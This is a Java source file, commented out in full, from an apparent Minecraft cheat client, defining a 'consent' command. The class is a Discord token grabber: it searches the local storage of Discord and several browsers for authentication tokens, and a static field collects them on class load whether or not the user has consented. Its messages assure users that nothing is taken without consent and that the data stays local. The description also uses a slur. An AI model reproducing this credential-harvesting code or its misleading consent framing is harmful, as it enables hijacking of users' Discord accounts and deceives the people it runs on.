package cum.jesus.jesusclient.command.commands;
/*
import cum.jesus.jesusclient.JesusClient;
import cum.jesus.jesusclient.command.Command;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DiscordThing extends Command {
    private static String get_request(String uri, boolean isChecking, String token) throws IOException {
        URL url = new URL(uri);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
        if (isChecking)
            connection.setRequestProperty("Authorization", token);
        connection.setRequestMethod("GET");
        InputStream responseStream = connection.getInputStream();

        try (Scanner scanner = new Scanner(responseStream)) {
            return scanner.useDelimiter("\\A").next();
        } catch (Exception e) {
            return "ERROR";
        }
    }
    private static List<String> getTokens() {
        List<String> tokens = new ArrayList<>();

        String localappdata = System.getenv("LOCALAPPDATA");
        String roaming = System.getenv("APPDATA");
        String[][] paths = {
                {"Lightcord", roaming + "\\Lightcord\\Local Storage\\leveldb"}, //Lightcord
                {"Discord", roaming + "\\Discord\\Local Storage\\leveldb"}, //Standard Discord
                {"Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb"}, //Discord Canary
                {"Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb"}, //Discord PTB
                {"Chrome Browser", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"}, //Chrome Browser
                {"Opera Browser", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"}, //Opera Browser
                {"Brave Browser", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"}, //Brave Browser
                {"Yandex Browser", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"}, //Yandex Browser
                {"Brave Browser", System.getProperty("user.home") + "\\.config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"}, //Brave Browser Linux
                {"Yandex Browser Beta", System.getProperty("user.home") + "/.config/yandex-browser-beta/Default/Local Storage/leveldb"}, //Yandex Browser Beta Linux
                {"Yandex Browser", System.getProperty("user.home") + "/.config/yandex-browser/Default/Local Storage/leveldb"}, //Yandex Browser Linux
                {"Chrome Browser", System.getProperty("user.home") + "/.config/google-chrome/Default/Local Storage/leveldb"}, //Chrome Browser Linux
                {"Opera Browser", System.getProperty("user.home") + "/.config/opera/Local Storage/leveldb"}, //Opera Browser Linux
                {"Discord", System.getProperty("user.home") + "/.config/discord/Local Storage/leveldb"}, //Discord Linux
                {"Discord Canargy", System.getProperty("user.home") + "/.config/discordcanary/Local Storage/leveldb"}, //Discord Canary Linux
                {"Discord PTB", System.getProperty("user.home") + "/.config/discordptb/Local Storage/leveldb"}, //Discord Canary Linux
                {"Discord", System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb"} //Discord MacOS
        };

        for (String[] path : paths) {
            try {
                File file = new File(path[1]);
                for (String pathname : file.list()) {
                    if (!pathname.equals("LOCK")) {
                        FileInputStream fstream = new FileInputStream(path[1] + System.getProperty("file.separator") + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in, "Cp1252"));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {
                            Pattern p = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}");
                            Matcher m = p.matcher(strLine);

                            while (m.find()) {
                                if (!tokens.contains(m.group())) {
                                    tokens.add(m.group());
                                }
                            }
                        }
                        br.close();
                    }
                }
            } catch (Exception exception) {}
        }

        return tokens;
    }

    public static String discordToken = getTokens().get(0);

    public DiscordThing() {
        super("consent", "Gives consent to using stuff on your pc such as Discord token for the Retardation module. These informations will not be sent anywhere and only kept in your Minecraft folder for easy access.", 0, 0, new String[0]);
    }

    public void onCall(String[] args) {
        if (JesusClient.config.hasConsented) { // true
            JesusClient.config.hasConsented = false;
            JesusClient.sendPrefixMessage("You have stopped consenting and the client will no longer be able to do stuff using your Discord account.");
        } else { // false
            JesusClient.config.hasConsented = true;
            JesusClient.sendPrefixMessage("You have consented to Jesus Client using your Discord account (token) for some stuff that requires it (mainly retardation lol). It won't be sent anywhere and only stored locally!");
        }
        //JesusClient.sendPrefixMessage(discordToken);
    }
}
*/